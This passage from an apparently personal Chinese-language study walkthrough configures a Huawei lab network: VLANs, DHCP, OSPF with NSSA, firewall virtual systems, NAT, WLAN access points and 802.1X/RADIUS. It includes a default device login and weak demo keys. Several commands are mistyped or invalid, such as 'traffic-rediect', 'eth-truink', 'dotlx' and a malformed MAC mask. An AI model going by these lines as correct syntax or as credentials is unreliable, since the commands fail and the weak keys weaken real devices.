global\nq\n```\n\n> [!TIP]\n>\n> \u68c0\u67e5\u547d\u4ee4\uff1a\n>\n> dis ip vpn-in ver \u67e5\u770bVPN\u5b9e\u4f8b\u7ed1\u5b9a\u7684\u63a5\u53e3\n\n### X_T1_AGG1\n\n```\nv b 11 to 15 21 to 25 100 208\nint eth2\np h t v 11 to 15 21 to 25 100\nint eth3\np h t v 11 to 15 21 to 25\nq\n```\n\n### X_T2_AGG1\n\n```\nv b 100 209 31 to 35 41 to 45\nint eth 1\np l t\np t a v 100 209\nint eth 2\np h t v 31 to 35 41 to 45\nint eth 3\np h t v 100 31 to 35 41 to 45\nint vlan 209\nip add 10.1.200.34 30\nint l0\nip add 10.1.0.7 32\nq\n```\n\n### X_T1_ACC1\n\n```\nvlan 100\nq\nint g0/0/22\np l a\np d v 100\nint eth 1\np l t\np t a v 100\nq\n```\n\n### X_T2_ACC2\n\n```\nvlan 100\nint eth 1\np l t\np t a v 100\nint g0/0/22\np l a\np d v 100\nq\n```\n\n*ps:\u5982\u679cg1-20\u7a7a\u975ehybrid\uff0c\u5219\u9700\u8981\u6539\u56dehybrid*\n\n### X_T1_AC1\n\n```\nv b 51 to 55 100 to 105\ndhcp en\nint vlan 100\nip add 10.1.100.254 255.255.255.0\ndhcp select inter\nint g0/0/1\np t a v 51 to 55 101 to 105 100 203\nq\n```\n\n> [!TIP]\n>\n> \u68c0\u67e5\u547d\u4ee4\uff1a\n>\n> dis vlan sum \u68c0\u67e5vlan\n>\n> dis port vlan \u68c0\u67e5vlan\u5212\u5206\n>\n> dis ip in b      \u68c0\u67e5ip\n\n# 4 \u6838\u5fc3\u4ea4\u6362\u673aDHCP\u5730\u5740\u6c60\u914d\u7f6e\n\n![image-20250811090218906](http://7r1UMPHK.github.io/image/20250813214121814.webp)\n\n## Core\n\n```\nip pool market11\nvpn-in Employee\ngate 10.1.11.254\nnet 10.1.11.0 mask 255.255.255.0\nip pool market12\nvpn-in Employee\ngate 10.1.12.254\nnet 10.1.12.0 mask 255.255.255.0\nip pool market13\nvpn-in Employee\ngate 10.1.13.254\nnet 10.1.13.0 mask 255.255.255.0\nip pool market14\nvpn-in Employee\ngate 10.1.14.254\nnet 10.1.14.0 mask 255.255.255.0\nip pool market15\nvpn-in Employee\ngate 10.1.15.254\nnet 10.1.15.0 mask 255.255.255.0\n\nip pool procure21\nvpn-in Employee\ngate 10.1.21.254\nnet 10.1.21.0 mask 255.255.255.0\nip pool procure22\nvpn-in Employee\ngate 10.1.22.254\nnet 10.1.22.0 mask 255.255.255.0\nip pool procure23\nvpn-in Employee\ngate 10.1.23.254\nnet 10.1.23.0 mask 255.255.255.0\nip pool procure24\nvpn-in Employee\ngate 10.1.24.254\nnet 10.1.24.0 mask 255.255.255.0\nip pool procure25\nvpn-in Employee\ngate 10.1.25.254\nnet 10.1.25.0 mask 255.255.255.0\n\nip pool finance31\nvpn-in Employee\ngate 10.1.31.254\nnet 10.1.31.0 mask 255.255.255.0\nip pool finance32\nvpn-in Employee\ngate 10.1.32.254\nnet 10.1.32.0 mask 255.255.255.0\nip pool finance33\nvpn-in Employee\ngate 10.1.33.254\nnet 10.1.33.0 mask 255.255.255.0\nip pool finance34\nvpn-in Employee\ngate 10.1.34.254\nnet 10.1.34.0 mask 255.255.255.0\nip pool finance35\nvpn-in Employee\ngate 10.1.35.254\nnet 10.1.35.0 mask 255.255.255.0\n\nip pool hr41\nvpn-in Employee\ngate 10.1.41.254\nnet 10.1.41.0 mask 255.255.255.0\nip pool hr42\nvpn-in Employee\ngate 10.1.42.254\nnet 10.1.42.0 mask 255.255.255.0\nip pool hr43\nvpn-in Employee\ngate 10.1.43.254\nnet 10.1.43.0 mask 255.255.255.0\nip pool hr44\nvpn-in Employee\ngate 10.1.44.254\nnet 10.1.44.0 mask 255.255.255.0\nip pool hr45\nvpn-in Employee\ngate 10.1.45.254\nnet 10.1.45.0 mask 255.255.255.0\n\nip pool employee51\nvpn-in Employee\ngate 10.1.51.254\nnet 10.1.51.0 mask 255.255.255.0\nip pool employee52\nvpn-in Employee\ngate 10.1.52.254\nnet 10.1.52.0 mask 255.255.255.0\nip pool employee53\nvpn-in Employee\ngate 10.1.53.254\nnet 10.1.53.0 mask 255.255.255.0\nip pool employee54\nvpn-in Employee\ngate 10.1.54.254\nnet 10.1.54.0 mask 255.255.255.0\nip pool employee55\nvpn-in Employee\ngate 10.1.55.254\nnet 10.1.55.0 mask 255.255.255.0\n\nip pool Guest101\nvpn-in Guest\ngate 10.1.101.254\nnet 10.1.101.0 mask 255.255.255.0\nip pool Guest102\nvpn-in Guest\ngate 10.1.102.254\nnet 10.1.102.0 mask 255.255.255.0\nip pool Guest103\nvpn-in Guest\ngate 10.1.103.254\nnet 10.1.103.0 mask 255.255.255.0\nip pool Guest104\nvpn-in Guest\ngate 10.1.104.254\nnet 10.1.104.0 mask 255.255.255.0\nip pool Guest105\nvpn-in Guest\ngate 10.1.105.254\nnet 10.1.105.0 mask 255.255.255.0\nq\n```\n\n> [!TIP]\n>\n> \u68c0\u67e5\u547d\u4ee4:\n>\n> dis ip pool vpn-ins Employee\n>\n> dis ip pool vpn-ins Guest\n\n# 5 \u6838\u5fc3\u4ea4\u6362\u673aVLAN\u5730\u5740\u6c60\u914d\u7f6e\n\n![image-20250811090218906](http://7r1UMPHK.github.io/image/20250813214121814.webp)\n\n*ps:\u8fd9\u548c\u5806\u53e0ensp\u90fd\u505a\u4e0d\u4e86\uff0c\u6682\u65f6\u4e0d\u7ba1\uff0c\u6216\u8005\u4f60\u53bbAC\u505a\u6d4b\u8bd5\uff0c\u90a3\u4e2a\u53ef\u4ee5*\n\n## X_T1_AGG1\n\n```\nvlan pool market\nvlan 11 to 15\nvlan pool procure\nvlan 21 to 25\nq\n```\n\n## X_T2_AGG1\n\n```\nvlan pool finance\nvlan 31 to 35\nvlan pool hr\nvlan 41 to 45\nq\n```\n\n## X_T1_AC1\n\n```\nvlan pool employee\nvlan 51 to 55\nvlan pool Guest\nvlan 101 to 105\nq\n```\n\n> [!TIP]\n>\n> \u68c0\u67e5\u547d\u4ee4:\n>\n> dis vlan pool all\n\n# 6 \u4e09\u5c42\u8bbe\u5907OSPF\u914d\u7f6e\n\n## 6.1 \u6838\u5fc3\u4e0e\u51fa\u53e3\u8def\u7531\u5668\u7684OSPF\u914d\u7f6e\n\n### X_T1_Export1\n\n```\nospf 1 rou 10.1.0.1\ndefault-route-advertise always\na 0\nnet 10.1.0.1 0.0.0.0\nnet 10.1.200.1 0.0.0.0\nq\nq\n```\n\n### X_T1_Export2\n\n```\nospf 1 rou 10.1.0.2\ndefault-\na 0\nnet 10.1.0.2 0.0.0.0\nnet 10.1.200.5 0.0.0.0\nq\nq\n```\n\n### X_T1_Core1\n\n```\nospf 1 rou 10.1.0.3\na 0\nnet 10.1.0.3 0.0.0.0\nnet 10.1.200.2 0.0.0.0\nnet 10.1.200.6 0.0.0.0\nnet 10.1.200.9 0.0.0.0\nq\na 1\nnet 10.1.200.13 0.0.0.0\nq\na 2\nnet 10.1.200.17 0.0.0.0\nq\nq\nospf 2 rou 10.1.0.4 vpn-ins Employee\nvpn-inst simple\nsilent-int vlan51\nsilent-int vlan52\nsilent-int vlan53\nsilent-int vlan54\nsilent-int vlan55\nsilent-int vlan60\na 1\nnet 10.1.0.0 0.0.255.255\nq\nq\nospf 3 rou 10.1.0.5 vpn-ins Guest\nvpn-inst simple\nsilent-int vlan101\nsilent-int vlan102\nsilent-int vlan103\nsilent-int vlan104\nsilent-int vlan105\na 2\nnet 10.1.0.0 0.0.255.255\nq\nq\n```\n\n## 6.2 T1\u6c47\u805a\u7684OSPF\u914d\u7f6e\n\n### 6.2.1 DHCP\u914d\u7f6e\n\n![image-20250811090218906](http://7r1UMPHK.github.io/image/20250813214121814.webp)\n\n#### X_T1_AGG1\n\n\u57fa\u7840\u914d\u7f6e\u524d\u9762**2 \u57fa\u7840\u4e1a\u52a1\u9700\u6c42**\u5df2\u7ecf\u914d\u7f6e\u8fc7\u4e86\n\n*ps:\u6253\u5f00\u4f60\u7684\u8bb0\u4e8b\u672c\uff0cctrl+c\uff0cctrl+v\uff0c\u54c8\u54c8\u54c8*\n\n```\ndhcp en\nint vlan 11\nip add 10.1.11.254 255.255.255.0\ndhcp select relay\ndhcp relay server-ip 10.1.200.29\nint vlan 12\nip add 10.1.12.254 255.255.255.0\ndhcp select relay\ndhcp relay server-ip 10.1.200.29\nint vlan 13\nip add 10.1.13.254 255.255.255.0\ndhcp select relay\ndhcp relay server-ip 10.1.200.29\nint vlan 14\nip add 10.1.14.254 255.255.255.0\ndhcp select relay\ndhcp relay server-ip 10.1.200.29\nint vlan 15\nip add 10.1.15.254 255.255.255.0\ndhcp select relay\ndhcp relay server-ip 10.1.200.29\n\nint vlan 21\nip add 10.1.21.254 255.255.255.0\ndhcp select relay\ndhcp relay server-ip 10.1.200.29\nint vlan 22\nip add 10.1.22.254 255.255.255.0\ndhcp select relay\ndhcp relay server-ip 10.1.200.29\nint vlan 23\nip add 10.1.23.254 255.255.255.0\ndhcp select relay\ndhcp relay server-ip 10.1.200.29\nint vlan 24\nip add 10.1.24.254 255.255.255.0\ndhcp select relay\ndhcp relay server-ip 10.1.200.29\nint vlan 25\nip add 10.1.25.254 255.255.255.0\ndhcp select relay\ndhcp relay server-ip 10.1.200.29\nq\n```\n\n##### \u68c0\u67e5\n\n![image-20250811170247422](http://7r1UMPHK.github.io/image/20250813214119189.webp)\n\n![image-20250811170400091](http://7r1UMPHK.github.io/image/20250813214117533.webp)\n\n### 6.2.2 OSPF \u914d\u7f6e\n\n#### X_T1_AGG1\n\n```\nospf 1 rou 10.1.0.6\nsilent-int vlan 11\nsilent-int vlan 12\nsilent-int vlan 13\nsilent-int vlan 14\nsilent-int vlan 15\nsilent-int vlan 21\nsilent-int vlan 22\nsilent-int vlan 23\nsilent-int vlan 24\nsilent-int vlan 25\na 1\nnet 10.1.0.0 0.0.255.255\nq\nq\n```\n\n## 6.3 \u6c47\u805a\u7684OSPF \u914d\u7f6e\n\n### 6.3.1 DHCP\u914d\u7f6e\n\n#### X_T2_AGG1\n\n\u57fa\u7840\u914d\u7f6e\u524d\u9762**2 \u57fa\u7840\u4e1a\u52a1\u9700\u6c42**\u5df2\u7ecf\u914d\u7f6e\u8fc7\u4e86\n\n```\ndhcp en\nint vlan 31\nip add 10.1.31.254 255.255.255.0\ndhcp sel rel\ndhcp rel server-ip 10.1.200.33\nint vlan 32\nip add 10.1.32.254 255.255.255.0\ndhcp sel rel\ndhcp rel server-ip 10.1.200.33\nint vlan 33\nip add 10.1.33.254 255.255.255.0\ndhcp sel rel\ndhcp rel server-ip 10.1.200.33\nint vlan 34\nip add 10.1.34.254 255.255.255.0\ndhcp sel rel\ndhcp rel server-ip 10.1.200.33\nint vlan 35\nip add 10.1.35.254 255.255.255.0\ndhcp sel rel\ndhcp rel server-ip 10.1.200.33\n\nint vlan 41\nip add 10.1.41.254 255.255.255.0\ndhcp sel rel\ndhcp rel server-ip 10.1.200.33\nint vlan 42\nip add 10.1.42.254 255.255.255.0\ndhcp sel rel\ndhcp rel server-ip 10.1.200.33\nint vlan 43\nip add 10.1.43.254 255.255.255.0\ndhcp sel rel\ndhcp rel server-ip 10.1.200.33\nint vlan 44\nip add 10.1.44.254 255.255.255.0\ndhcp sel rel\ndhcp rel server-ip 10.1.200.33\nint vlan 45\nip add 10.1.45.254 255.255.255.0\ndhcp sel rel\ndhcp rel server-ip 10.1.200.33\nq\n```\n\n##### \u68c0\u67e5\n\n![image-20250812104327092](http://7r1UMPHK.github.io/image/20250813214115137.webp)\n\n![image-20250812104359037](http://7r1UMPHK.github.io/image/20250813214113229.webp)\n\n### 6.3.2 OSPF \u914d\u7f6e\n\n#### X_T2_AGG1\n\n```\nospf 1 rou 10.1.0.7\nsilent-int vlan 31\nsilent-int vlan 32\nsilent-int vlan 33\nsilent-int vlan 34\nsilent-int vlan 35\nsilent-int vlan 41\nsilent-int vlan 42\nsilent-int vlan 43\nsilent-int vlan 44\nsilent-int vlan 45\na 1\nnet 10.1.0.0 0.0.255.255\nq\nq\n```\n\n#### X_T1_AC1\n\n*ps:\u53ef\u80fd\u4f1a\u6709\u4eba\u95ee\uff0c\u4e3a\u4ec0\u4e48\u6211\u90fd\u6ca1\u6709\u914d\u7f6eip\u5c31\u76f4\u63a5\u914dospf\uff0c\u662f\u56e0\u4e3a\u4ed6\u662f\u9884\u914d\u7684\uff0c\u4f60\u53ef\u4ee5\u770b\u770bAC1\u7684ip\u8868*\n\n```\nospf 1 rou 10.1.0.11\na 0\nnet 10.1.0.11 0.0.0.0\nnet 10.1.200.10 0.0.0.0\nq\nq\n```\n\n# 7 \u9632\u706b\u5899\u914d\u7f6e\n\n## 7.1\u865a\u62df\u7cfb\u7edf\u914d\u7f6e\n\n### X_T1_FW1\n\n> [!TIP]\n>\n> \u9ed8\u8ba4\u5bc6\u7801\uff1a\n>\n> admin:Admin@123\n\n```\nv b 204 to 207\nint g1/0/1\nPortsw\np l t\np t a v 204 to 205\nun p t a v 1\nint g1/0/2\nPortsw\np l t\np t a v 206 to 207\nun p t a v 1\nq\n```\n\n### \u68c0\u67e5\n\n![image-20250812111534076](http://7r1UMPHK.github.io/image/20250813214111296.webp)\n\n```\nint l1\nint l2\nq\nvsys en\nvsys name Employee\nassign int l1\nassign vlan 204\nassign vlan 206\nint vlan 204\nip add 10.1.200.14 255.255.255.252\nint vlan 206\nip add 10.1.200.22 255.255.255.252\nint l1\nip add 10.1.0.8 255.255.255.255\nq\n```\n\n### \u68c0\u67e5\n\n![image-20250812154330726](http://7r1UMPHK.github.io/image/20250813214109918.webp)\n\n```\nswitch vsys Employee\nsy\nfirewall zone trust\nadd int vlan 206\nfirewall zone untrust\nadd int vlan 204\nsecurity-po\nrule name ospf\nsource-z trust untrust local\ndestination-zone trust untrust local\nservice ospf\naction permit\nq\nq\nquit\nquit\nvsys en\nvsys na Guest\nassign int l2\nassign vlan 205\nassign vlan 207\nint vlan 205\nip add 10.1.200.18 255.255.255.252\nint vlan 207\nip add 10.1.200.26 255.255.255.252\nint l2\nip add 10.1.0.9 255.255.255.255\nq\n\nswitch vsys Guest\nsy\nfirewall zone trust\nadd int vlan 207\nfirewall zone untrust\nadd int vlan 205\nsecurity-po\nrule name ospf\nsource-z trust untrust local\ndestination-zone trust untrust local\nservice ospf\naction permit\nq\nq\nquit\nquit\n```\n\n## 7.2 OSPF \u7684\u914d\u7f6e\n\n### X_T1_FW1\n\n```\nospf 1 rou 10.1.0.8 vpn-ins Employee\nvpn-instance-cap simple\na 1\nnet 10.1.0.8 0.0.0.0\nnet 10.1.200.14 0.0.0.0\nnet 10.1.200.22 0.0.0.0\nq\nq\n\nospf 2 rou 10.1.0.9 vpn-ins Guest\nvpn-instance-cap simple\na 2\nnet 10.1.0.9 0.0.0.0\nnet 10.1.200.18 0.0.0.0\nnet 10.1.200.26 0.0.0.0\nq\nq\n```\n\n### \u9a8c\u8bc1\n\n\u53bbcore\u67e5\u770bospf peer\n\n![image-20250812165616221](http://7r1UMPHK.github.io/image/20250813214106871.webp)\n\n\u4e00\u51719\u4e2a\uff0c\u5168\u90e8full\n\n# 8 \u6838\u5fc3\u4ea4\u6362\u673a\u8fc7\u6ee4\u6307\u5b9a3\u7c7bLSA AND \u914d\u7f6e NSSA \u533a\u57df\n\n*ps:\u8fd8\u662f\u5efa\u8bae\u8bb0\u4e8b\u672c\u590d\u5236\u5927\u6cd5*\n\n## X_T1_Core1\n\n```\nip ip-prefix Employee deny 10.1.11.0 24\nip ip-prefix Employee deny 10.1.12.0 24\nip ip-prefix Employee deny 10.1.13.0 24\nip ip-prefix Employee deny 10.1.14.0 24\nip ip-prefix Employee deny 10.1.15.0 24\n\nip ip-prefix Employee deny 10.1.21.0 24\nip ip-prefix Employee deny 10.1.22.0 24\nip ip-prefix Employee deny 10.1.23.0 24\nip ip-prefix Employee deny 10.1.24.0 24\nip ip-prefix Employee deny 10.1.25.0 24\n\nip ip-prefix Employee deny 10.1.31.0 24\nip ip-prefix Employee deny 10.1.32.0 24\nip ip-prefix Employee deny 10.1.33.0 24\nip ip-prefix Employee deny 10.1.34.0 24\nip ip-prefix Employee deny 10.1.35.0 24\n\nip ip-prefix Employee deny 10.1.41.0 24\nip ip-prefix Employee deny 10.1.42.0 24\nip ip-prefix Employee deny 10.1.43.0 24\nip ip-prefix Employee deny 10.1.44.0 24\nip ip-prefix Employee deny 10.1.45.0 24\n\nip ip-prefix Employee deny 10.1.51.0 24\nip ip-prefix Employee deny 10.1.52.0 24\nip ip-prefix Employee deny 10.1.53.0 24\nip ip-prefix Employee deny 10.1.54.0 24\nip ip-prefix Employee deny 10.1.55.0 24\n\nip ip-prefix Employee permit 0.0.0.0 0 less-equal 32\n\nip ip-prefix Guest deny 10.1.101.0 24\nip ip-prefix Guest deny 10.1.102.0 24\nip ip-prefix Guest deny 10.1.103.0 24\nip ip-prefix Guest deny 10.1.104.0 24\nip ip-prefix Guest deny 10.1.105.0 24\n\nip ip-prefix Guest permit 0.0.0.0 0 less-equal 32\n\nospf 1\na 1\nfilter ip-prefix Guest imp\nq\na 2\nfilter ip-prefix Employee imp\nnssa\nq\nq\nospf 3\na 2\nnssa\nq\nq\n```\n\n## X_T1_FW1\n\n```\nospf 2\na 2\nnssa\nq\nq\n```\n\n## \u68c0\u67e5\n\n![image-20250812161934561](http://7r1UMPHK.github.io/image/20250813214104057.webp)\n\n![image-20250812170719317](http://7r1UMPHK.github.io/image/20250813214102133.webp)\n\n# 9 \u51fa\u53e3\u7f51\u7edc\u914d\u7f6e\n\n## X_T1_Export1\n\n```\n----\u8fd9\u91cc\u7684\u662f\u9884\u914d\u7684\uff0c\u53ea\u662f\u6211\u8fd9\u62d3\u6251\u6ca1\u6709----\nip rou 0.0.0.0 0.0.0.0 10.255.1.254\nip rou 0.0.0.0 0.0.0.0 10.255.2.254\nacl 2000\nrule 5 permit\nquit\nint g0/0/0\nnat out 2000\nint g0/0/1\nnat out 2000\nq\n-----------------------------------\nacl 2000\nundo rule 5\nrule permit sou 10.1.11.0 0.0.0.255\nrule permit sou 10.1.12.0 0.0.0.255\nrule permit sou 10.1.13.0 0.0.0.255\nrule permit sou 10.1.14.0 0.0.0.255\nrule permit sou 10.1.15.0 0.0.0.255\n\nrule permit sou 10.1.21.0 0.0.0.255\nrule permit sou 10.1.22.0 0.0.0.255\nrule permit sou 10.1.23.0 0.0.0.255\nrule permit sou 10.1.24.0 0.0.0.255\nrule permit sou 10.1.25.0 0.0.0.255\n\nrule permit sou 10.1.51.0 0.0.0.255\nrule permit sou 10.1.52.0 0.0.0.255\nrule permit sou 10.1.53.0 0.0.0.255\nrule permit sou 10.1.54.0 0.0.0.255\nrule permit sou 10.1.55.0 0.0.0.255\n\nrule permit sou 10.1.101.0 0.0.0.255\nrule permit sou 10.1.102.0 0.0.0.255\nrule permit sou 10.1.103.0 0.0.0.255\nrule permit sou 10.1.104.0 0.0.0.255\nrule permit sou 10.1.105.0 0.0.0.255\nq\n```\n\n## \u68c0\u67e5\n\n![image-20250813093949534](http://7r1UMPHK.github.io/image/20250813214100032.webp)\n\n## X_T1_Export2\n\n```\nip rou 0.0.0.0 0.0.0.0 10.255.3.254\nip rou 0.0.0.0 0.0.0.0 10.255.4.254\nnat address-group 1 10.255.4.2 10.255.4.100\nacl 2000\nrule permit sou 10.1.11.0 0.0.0.255\nrule permit sou 10.1.12.0 0.0.0.255\nrule permit sou 10.1.13.0 0.0.0.255\nrule permit sou 10.1.14.0 0.0.0.255\nrule permit sou 10.1.15.0 0.0.0.255\n\nrule permit sou 10.1.21.0 0.0.0.255\nrule permit sou 10.1.22.0 0.0.0.255\nrule permit sou 10.1.23.0 0.0.0.255\nrule permit sou 10.1.24.0 0.0.0.255\nrule permit sou 10.1.25.0 0.0.0.255\n\nrule permit sou 10.1.51.0 0.0.0.255\nrule permit sou 10.1.52.0 0.0.0.255\nrule permit sou 10.1.53.0 0.0.0.255\nrule permit sou 10.1.54.0 0.0.0.255\nrule permit sou 10.1.55.0 0.0.0.255\n\nrule permit sou 10.1.101.0 0.0.0.255\nrule permit sou 10.1.102.0 0.0.0.255\nrule permit sou 10.1.103.0 0.0.0.255\nrule permit sou 10.1.104.0 0.0.0.255\nrule permit sou 10.1.105.0 0.0.0.255\nq\n\nint g0/0/0\nnat out 2000\nint g0/0/1\nnat server protocol tcp global current-int 8081 ins 10.1.60.101 80\nnat out 2000 address-group 1\nq\n```\n\n## \u5b9e\u73b0\u56de\u7a0b\u6d41\u91cf\u8f6c\u53d1\n\n### Core\n\n```\nacl 3001\nrule permit ip sou 10.1.60.101 0\nint vlan 204\n----------\u8fd9\u6761\u6a21\u62df\u5668\u505a\u4e0d\u4e86\uff0c\u4f60\u53ef\u4ee5\u5199\u4e2a\u63cf\u8ff0\u8bb0\u5fc6\u4e00\u4e0b----------\ntraffic-rediect inbound acl 3001 ip-nexthop 10.1.200.5\n-----------------------------------------------------\nq\n```\n\n### X_T1_Export2\n\n```\nacl 3001\nrule permit ip sou 10.1.60.101 0\ntraffic classifier web\nif-match acl 3001\ntraffic behavior web\nredirect ip-nexthop 10.255.4.254\ntraffic policy web\nclassifier web behavior web\nint vlan 202\ntraffic-policy web inbound\nq\n```\n\n# 10 WLAN\u6269\u5c55\u9700\u6c42\n\n*ps:\u8003\u8bd5\u7684\u65f6\u5019\uff0c\u6bcf\u4e2a\u4eba\u7684AC\u9884\u914d\u6a21\u677f\u540d\u5b57\u662f\u4e0d\u4e00\u6837\u7684\u3002*\n\n\u8fd9\u662f\u6211\u7684\u9884\u914d\u6a21\u677f\uff0c\u53ea\u662f\u63d0\u4f9b\u53c2\u7167\u3002\n\n```\nwlan\n traffic-profile name default\n security-profile name default\n security-profile name X_Guest\n  security wpa-wpa2 psk pass-phrase %^%#81*JKo7<}DcIVzR3Lz/4(:!R=HMpVT3P^*XG[dCB\n%^%# aes\n security-profile name X_Employee\n  security wpa-wpa2 psk pass-phrase %^%#i#Ou6&},h,-1.CNu{`N:K''qIaQs>%G$+(WxjCy'\n%^%# aes\n security-profile name default-wds\n security-profile name X_GEmployee\n security-profile name default-mesh\n ssid-profile name default\n ssid-profile name X_Guest\n  ssid X_Guest\n ssid-profile name X_Employee\n  ssid X_Employee\n vap-profile name default\n vap-profile name X_Guest\n  service-vlan vlan-id 32\n  ssid-profile X_Guest\n  security-profile X_Guest\n vap-profile name X_Employee\n  service-vlan vlan-id 31\n  ssid-profile X_Employee\n  security-profile X_Employee\n wds-profile name default\n mesh-handover-profile name default\n mesh-profile name default\n regulatory-domain-profile name default\n air-scan-profile name default\n rrm-profile name default\n radio-2g-profile name default\n radio-5g-profile name default\n wids-spoof-profile name default\n wids-profile name default\n wireless-access-specification\n ap-system-profile name default\n port-link-profile name default\n wired-port-profile name default\n serial-profile name preset-enjoyor-toeap \n ap-group name default\n ap-group name ap-group1\n  radio 0\n   vap-profile X_Employee wlan 1\n  radio 1\n   vap-profile X_Guest wlan 2\n ap-id 0 type-id 69 ap-mac 00e0-fc14-40d0 ap-sn 2102354483104B292D16\n  ap-name X_T1_AP1\n  ap-group ap-group1\n provision-ap\n#\nreturn\n```\n\n## 10.1 \u65b0\u589e X_T2_AP1\n\n> [!TIP]\n>\n> ap mac\u53ef\u4ee5\u901a\u8fc7 dis arp\u67e5\u770b\uff0clldp\u4e5f\u53ef\u4ee5\u770b\n\n```\nun capwap source ip-address\ncapwap source interface Vlanif 100\nwlan\n-----\u8fd9\u91cc\u7684\u8003\u8bd5\u6709\uff0c\u4f46\u662f\u6211\u9884\u914d\u6ca1\u6709\uff0c\u6240\u4ee5\u6211\u81ea\u5df1\u914d-----\nap-group name X\nvap-profile X_Employee wlan 1 radio all\nvap-profile X_Guest wlan 2 radio all\nq\nvap-profile name X_Employee\nservice-vlan vlan-pool Employee\ny\nforward-mode tunnel\ny\nq\nvap-profile name X_Guest\nservice-vlan vlan-pool Guest\ny\nforward-mode tunnel\ny\nq\n-------------------------------------------\nap-id 0\nap-group X\ny\nq\nap-id 1 ap-mac 00e0-fc66-08b0\nap-name X_T2_AP1\nap-group X\ny\nq\n```\n\n\u5982\u679c\u4e0d\u8138\u9ed1\u7684\u8bdd\uff0c\u4e00\u4f1a\u5c31\u53ef\u4ee5\u770b\u5230\u4e0a\u7ebf\u6210\u529f\u4e86\n\n![image-20250813105950024](http://7r1UMPHK.github.io/image/20250813214056465.webp)\n\n\u7136\u540e\u6839\u636e\u4f60\u684c\u5b50\u4e0a\u7684\u5c0f\u7eb8\u7eb8\uff0c\u6539\u5bc6\u7801\uff0c\u6211\u8fd9\u53ea\u662f\u6f14\u793a\n\n```\nsecurity-profile name X_Employee\nsecurity wpa-wpa2 psk pass-phrase Huawei@001 aes\ny\nsecurity-profile name X_Guest\nsecurity wpa-wpa2 psk pass-phrase Huawei@001 aes\ny\n```\n\n\u6d4b\u8bd5\u80fd\u8fde\u4e0a\u5c31\u597d\u4e86\n\n![image-20250813110553953](http://7r1UMPHK.github.io/image/20250813214054634.webp)\n\n# 11 \u51c6\u5165\u8ba4\u8bc1\n\n*ps:\u8fd9\u91cc\u53ea\u6709\u4e00\u90e8\u5206\u53ef\u4ee5\u914d\u7f6e\uff0c\u6240\u4ee5\u4e0d\u7528\u8fc7\u591a\u7ea0\u7ed3\uff0c\u53ef\u4ee5\u5148\u7ec3\u4e60\u4e00\u4e0b\uff0c\u7136\u540e\u4e0a\u771f\u673a\u914d\u7f6e*\n\n## X_T1_AGG1/X_T2_AGG1\n\n### radius \u6a21\u677f\n\n\u6ca1\u6709\u591a\u6267\u884c\uff0c\u90a3\u6211\u4eec\u5c31\u7ec3\u4e60\u4e00\u4e2a\u5c31\u597d\u4e86\n\n```\nradius-server template Employee\nradius-server authentication 10.1.60.2 1812\nradius-server shared-key cipher Huawei@123\nq\nradius-server authorization 10.1.60.2 shared-key cipher Huawei@123\n```\n\n### AAA\n\n```\naaa\nauthentication-scheme Employee\nauthentication-mode radius \nq\naccounting-scheme Employee\naccounting-mode radius\nq\nauthentication-scheme ap_noauthen\nauthentication-mode none\nq\n```\n\n### \u8ba4\u8bc1\u57df\n\n```\ndomain employee\nauthentication-scheme Employee\nradius-server Employee\nq\ndomain ap_noauthen\nauthentication-scheme ap_noauthen\nq\n```\n\n### AP\u8ba4\u8bc1\u57df\u7ed1\u5b9aMAC\uff08ensp\u505a\u4e0d\u4e86\uff09\n\n```\ndomain ap_noauthen mac-authen force mac-address 'AP\u7684MAC\u5730\u5740' mask ffff-fffr-fff\n```\n\n### \u63a5\u5165\u6a21\u677f\uff08ensp\u505a\u4e0d\u4e86\uff09\n\n```\ndotlx-access-profile name Employee\nmac-access-profile name Employee\n```\n\n### \u8ba4\u8bc1\u6a21\u677f\uff08ensp\u505a\u4e0d\u4e86\uff09\n\n```\nauthentication-profile name Employee\ndotlx-access-profile Employee\nmac-access-profile Employee\nauthentication dotlx-mac-bypass\naccess-domain employee force\n```\n\n### \u63a5\u53e3\u5f00\u8ba4\u8bc1\uff08ensp\u505a\u4e0d\u4e86\uff09\n\n\u4e5f\u662f\u4e24\u4e2a\u90fd\u8981\uff0c\u6211\u8fd9\u53ea\u6f14\u793a\u4e00\u4e2a\n\n*ps:\u805a\u5408\u53e3\u662f\u4f7f\u7528\u4e0b\u8054\u7684\u805a\u5408\u7a7a\uff0c\u7075\u6d3b\u5e94\u7528*\n\n```\nint eth-trunk 2\nauthentication-profile Employee\nint eth-truink 3\nauthentication-profile Employee\n```\n\n## \u5168ACC\u900f\u4f20\uff08\u5168\u90e8acc\u90fd\u9700\u8981\u914d\u7f6e\uff09\n\n```\nl2protocol-tunnel user-defined-protocol 802.1x protocol-mac 0180-c200-0003 group-mac 0100-0000-0002\n```\n\n### \u63a5\u53e3\u7ed1\u5b9a802.1X\u8ba4\u8bc1\uff08\u5168\u90e8acc\u90fd\u9700\u8981\u914d\u7f6e\uff09\n\n```\nint rang g 0/0/1 to g0/0/20           \n//\u8fd9\u6761ensp\u4e0d\u652f\u6301\uff0censp\u53ef\u4ee5\u4f7f\u7528 p g g0/0/1 to g0/0/20\nl2protocol-tunnel user-defined-protocol 802.1x enable\nq\ninterface Eth-Trunk 1             //\u4e0a\u8054\u805a\u5408\u53e3\nl2protocol-tunnel user-defined-protocol 802.1x enable\n```\n\n# 12 \u7f51\u7edc\u5b89\u5168\u9700\u6c42\n\n## 12.1 vsys Employee\u914d\u7f6e\n\n### 12.1.1 \u5730\u5740\u96c6\n\n#### X_T1_FW1\n\n```\nswitch vsys Employee\nsy\nip address-set market type group\naddress 10.1.11.0 mask 24\naddress 10.1.12.0 mask 24\naddress 10.1.13.0 mask 24\naddress 10.1.14.0 mask 24\naddress 10.1.15.0 mask 24\n\nip address-set procure type group\naddress 10.1.21.0 mask 24\naddress 10.1.22.0 mask 24\naddress 10.1.23.0 mask 24\naddress 10.1.24.0 mask 24\naddress 10.1.25.0 mask 24\n\nip address-set wlan type group\naddress 10.1.51.0 mask 24\naddress 10.1.52.0 mask 24\naddress 10.1.53.0 mask 24\naddress 10.1.54.0 mask 24\naddress 10.1.55.0 mask 24\n\nip address-set hr-finance type group\naddress 10.1.31.0 mask 24\naddress 10.1.32.0 mask 24\naddress 10.1.33.0 mask 24\naddress 10.1.34.0 mask 24\naddress 10.1.35.0 mask 24\naddress 10.1.41.0 mask 24\naddress 10.1.42.0 mask 24\naddress 10.1.43.0 mask 24\naddress 10.1.44.0 mask 24\naddress 10.1.45.0 mask 24\n\nip address-set X-Y-Z type group\naddress 10.3.101.0 mask 24\naddress 10.100.2.0 mask 24\naddress 10.2.31.0 mask 24\naddress 10.2.32.0 